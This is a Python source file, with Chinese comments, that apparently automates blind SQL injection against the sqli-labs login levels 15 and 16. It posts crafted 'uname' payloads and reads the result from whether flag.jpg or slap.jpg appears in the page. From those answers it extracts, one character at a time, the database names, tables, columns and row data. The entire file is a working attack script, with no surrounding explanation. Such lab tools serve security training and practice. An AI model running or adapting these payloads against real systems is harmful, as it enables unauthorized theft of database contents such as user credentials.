import requests
from bs4 import BeautifulSoup

class Less15_Less16(object):

    data = {}

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c,exploit):

        if url[-1] == "/":

            self.url = url

        else:

            self.url = url + "/"

        self.level = level

        self.dbs = dbs
                                # 初始化各自参数
        self.tables = tables

        self.columns = columns

        self.schema = schema

        self.d = d

        self.t = t 

        self.c = c

        self.exploit = exploit
                                    # 判断是否登陆
    def soup(self,text):
        if "flag.jpg" in text:
            return True
        elif "slap.jpg" in text:
            return False

    def dbs_payload(self):

        count = 0

        dbs = []

        asciis = 0

        strings = ''
                                                                # 大多数都是重复的，只有payload不一样
        if self.level == 15:

            while True:

                self.data['uname'] = "admin' and if((select count(schema_name) from information_schema.schemata)="+str(count)+",1,0)#"

                self.data['passwd'] = ''

                rep = requests.post(self.url,data=self.data)

                if self.soup(rep.text):
                    print("it will take some time")
                    break
                else:
                    count += 1


            for each in range(count):

                number = 0

                while True:

                    self.data['uname'] = "admin' and if((select length((select schema_name from information_schema.schemata limit "+str(each)+",1)))="+str(number)+",1,0) #"

                    self.data['passwd'] = ''

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text):

                        dbs.append(number)

                        break

                    else:

                        number += 1

            for i,db_len in enumerate(dbs):

                while True:

                    for each in range(1,db_len+1):

                        while True:

                            self.data['uname'] = "admin' and if(ascii(substr((select schema_name from information_schema.schemata limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",1,0) #"

                            self.data['passwd'] = ''

                            rep = requests.post(self.url,self.data)

                            if self.soup(rep.text):

                                strings += chr(asciis)

                                asciis = 0

                                break

                            else:

                                asciis += 1

                    print(strings)

                    strings = ''

                    break

        if self.level == 16:

            while True:

                self.data['uname'] = 'admin") and if((select count(schema_name) from information_schema.schemata)='+str(count)+',1,0)#'

                self.data['passwd'] = ''

                rep = requests.post(self.url,data=self.data)

                if self.soup(rep.text):
                    
                    print("it will take some time")

                    break

                else:

                    count += 1


            for each in range(count):

                number = 0

                while True:

                    self.data['uname'] = 'admin") and if((select length((select schema_name from information_schema.schemata limit '+str(each)+',1)))='+str(number)+',1,0) #'

                    self.data['passwd'] = ''

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text):

                        dbs.append(number)

                        break

                    else:

                        number += 1

            for i,db_len in enumerate(dbs):

                while True:

                    for each in range(1,db_len+1):

                        while True:

                            self.data['uname'] = 'admin") and if(ascii(substr((select schema_name from information_schema.schemata limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',1,0) #'

                            self.data['passwd'] = ''

                            rep = requests.post(self.url,self.data)

                            if self.soup(rep.text):

                                strings += chr(asciis)

                                asciis = 0

                                break

                            else:

                                asciis += 1

                    print(strings)

                    strings = ''

                    break


    def tables_payload(self):

        count = 0

        dbs = []

        asciis = 0

        strings = ''

        if self.level == 15:

            while True:

                self.data['uname'] = "admin' and if((select count(table_name) from information_schema.tables where table_schema='"+self.d+"')="+str(count)+",1,0)#"

                self.data['passwd'] = ''

                rep = requests.post(self.url,data=self.data)

                if self.soup(rep.text):

                    print("it will take some time")

                    break

                else:

                    count += 1


            for each in range(count):

                number = 0

                while True:

                    self.data['uname'] = "admin' and if((select length((select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(each)+",1)))="+str(number)+",1,0) #"

                    self.data['passwd'] = ''

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text):

                        dbs.append(number)

                        break

                    else:

                        number += 1

            for i,db_len in enumerate(dbs):

                while True:

                    for each in range(1,db_len+1):

                        while True:

                            self.data['uname'] = "admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",1,0) #"

                            self.data['passwd'] = ''

                            rep = requests.post(self.url,self.data)

                            if self.soup(rep.text):

                                strings += chr(asciis)

                                asciis = 0

                                break

                            else:

                                asciis += 1

                    print(strings)

                    strings = ''

                    break


        if self.level == 16:

            while True:

                self.data['uname'] = 'admin") and if((select count(table_name) from information_schema.tables where table_schema="'+self.d+'")='+str(count)+',1,0)#'

                self.data['passwd'] = ''

                rep = requests.post(self.url,data=self.data)

                if self.soup(rep.text):

                    print("it will take some time")

                    break

                else:

                    count += 1


            for each in range(count):

                number = 0

                while True:

                    self.data['uname'] = 'admin") and if((select length((select table_name from information_schema.tables where table_schema="'+self.d+'" limit '+str(each)+',1)))='+str(number)+',1,0) #'

                    self.data['passwd'] = ''

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text):

                        dbs.append(number)

                        break

                    else:

                        number += 1

            for i,db_len in enumerate(dbs):

                while True:

                    for each in range(1,db_len+1):

                        while True:

                            self.data['uname'] = 'admin") and if(ascii(substr((select table_name from information_schema.tables where table_schema="'+self.d+'" limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',1,0) #'

                            self.data['passwd'] = ''

                            rep = requests.post(self.url,self.data)

                            if self.soup(rep.text):

                                strings += chr(asciis)

                                asciis = 0

                                break

                            else:

                                asciis += 1

                    print(strings)

                    strings = ''

                    break



    def columns_payload(self):

        count = 0

        dbs = []

        asciis = 0

        strings = ''

        if self.level == 15:

            while True:

                self.data['uname'] = "admin' and if((select count(column_name) from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"')="+str(count)+",1,0)#"

                self.data['passwd'] = ''

                rep = requests.post(self.url,data=self.data)

                if self.soup(rep.text):

                    print("it will take some time")

                    break

                else:

                    count += 1


            for each in range(count):

                number = 0

                while True:

                    self.data['uname'] = "admin' and if((select length((select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(each)+",1)))="+str(number)+",1,0) #"

                    self.data['passwd'] = ''

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text):

                        dbs.append(number)

                        break

                    else:

                        number += 1

            for i,db_len in enumerate(dbs):

                while True:

                    for each in range(1,db_len+1):

                        while True:

                            self.data['uname'] = "admin' and if(ascii(substr((select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",1,0) #"

                            self.data['passwd'] = ''

                            rep = requests.post(self.url,self.data)

                            if self.soup(rep.text):

                                strings += chr(asciis)

                                asciis = 0

                                break

                            else:

                                asciis += 1

                    print(strings)

                    strings = ''

                    break


        if self.level == 16:

            while True:

                self.data['uname'] = 'admin") and if((select count(column_name) from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'")='+str(count)+',1,0)#'

                self.data['passwd'] = ''

                rep = requests.post(self.url,data=self.data)

                if self.soup(rep.text):

                    print("it will take some time")

                    break

                else:

                    count += 1


            for each in range(count):

                number = 0

                while True:

                    self.data['uname'] = 'admin") and if((select length((select column_name from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'" limit '+str(each)+',1)))='+str(number)+',1,0) #'

                    self.data['passwd'] = ''

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text):

                        dbs.append(number)

                        break

                    else:

                        number += 1

            for i,db_len in enumerate(dbs):

                while True:

                    for each in range(1,db_len+1):

                        while True:

                            self.data['uname'] = 'admin") and if(ascii(substr((select column_name from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'" limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',1,0) #'

                            self.data['passwd'] = ''

                            rep = requests.post(self.url,self.data)

                            if self.soup(rep.text):

                                strings += chr(asciis)

                                asciis = 0

                                break

                            else:

                                asciis += 1

                    print(strings)

                    strings = ''

                    break



    def data_payload(self):

        count = 0

        dbs = []

        asciis = 0

        strings = ''

        if self.level == 15:

            while True:

                self.data['uname'] = "admin' and if((select count("+self.c+") from "+self.d+"."+self.t+")="+str(count)+",1,0)#"

                self.data['passwd'] = ''

                rep = requests.post(self.url,data=self.data)

                if self.soup(rep.text):

                    print("it will take some time")

                    break

                else:

                    count += 1


            for each in range(count):

                number = 0

                while True:

                    self.data['uname'] = "admin' and if((select length((select "+self.c+" from "+self.d+"."+self.t+" limit "+str(each)+",1)))="+str(number)+",1,0) #"

                    self.data['passwd'] = ''

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text):

                        dbs.append(number)

                        break

                    else:

                        number += 1

            for i,db_len in enumerate(dbs):

                while True:

                    for each in range(1,db_len+1):

                        while True:

                            self.data['uname'] = "admin' and if(ascii(substr((select "+self.c+" from "+self.d+"."+self.t+" limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",1,0) #"

                            self.data['passwd'] = ''

                            rep = requests.post(self.url,self.data)

                            if self.soup(rep.text):

                                strings += chr(asciis)

                                asciis = 0

                                break

                            else:

                                asciis += 1

                    print(strings)

                    strings = ''

                    break


        if self.level == 16:

            while True:

                self.data['uname'] = 'admin") and if((select count('+self.c+') from '+self.d+'.'+self.t+')='+str(count)+',1,0)#'

                self.data['passwd'] = ''

                rep = requests.post(self.url,data=self.data)

                if self.soup(rep.text):

                    print("it will take some time")

                    break

                else:

                    count += 1


            for each in range(count):

                number = 0

                while True:

                    self.data['uname'] = 'admin") and if((select length((select '+self.c+' from '+self.d+'.'+self.t+' limit '+str(each)+',1)))='+str(number)+',1,0) #'

                    self.data['passwd'] = ''

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text):

                        dbs.append(number)

                        break

                    else:

                        number += 1

            for i,db_len in enumerate(dbs):

                while True:

                    for each in range(1,db_len+1):

                        while True:

                            self.data['uname'] = 'admin") and if(ascii(substr((select '+self.c+' from '+self.d+'.'+self.t+' limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',1,0) #'

                            self.data['passwd'] = ''

                            rep = requests.post(self.url,self.data)

                            if self.soup(rep.text):

                                strings += chr(asciis)

                                asciis = 0

                                break

                            else:

                                asciis += 1

                    print(strings)

                    strings = ''

                    break



    def DBS(self):

        self.dbs_payload()

    def TABLES(self):           # 使用对应的payload

        self.tables_payload()

    def COLUMNS(self):

        self.columns_payload()

    def SCHEMA(self):

        self.data_payload()

    def TYPE(self):
        
        if self.exploit == 'username':

            if self.dbs:  # 如果枚举数据库被设置

                self.DBS()

            elif self.d != '' and self.tables: # 如果枚举表和数据库名被设置

                self.TABLES()

            elif self.t != '' and self.columns and self.d != '': # 如果枚举列,和数据表,和数据列被设置

                self.COLUMNS()

            elif self.c != '' and self.t != '' and self.d != '' and self.schema: # 如果数据表,数据库,数据列被设置

                self.SCHEMA()

            else:
                print("wrong options and bad type!")

        else:
            print("on the's level only support username field")


    def Less_15(self):
        self.TYPE()

    def Less_16(self):
        self.TYPE()

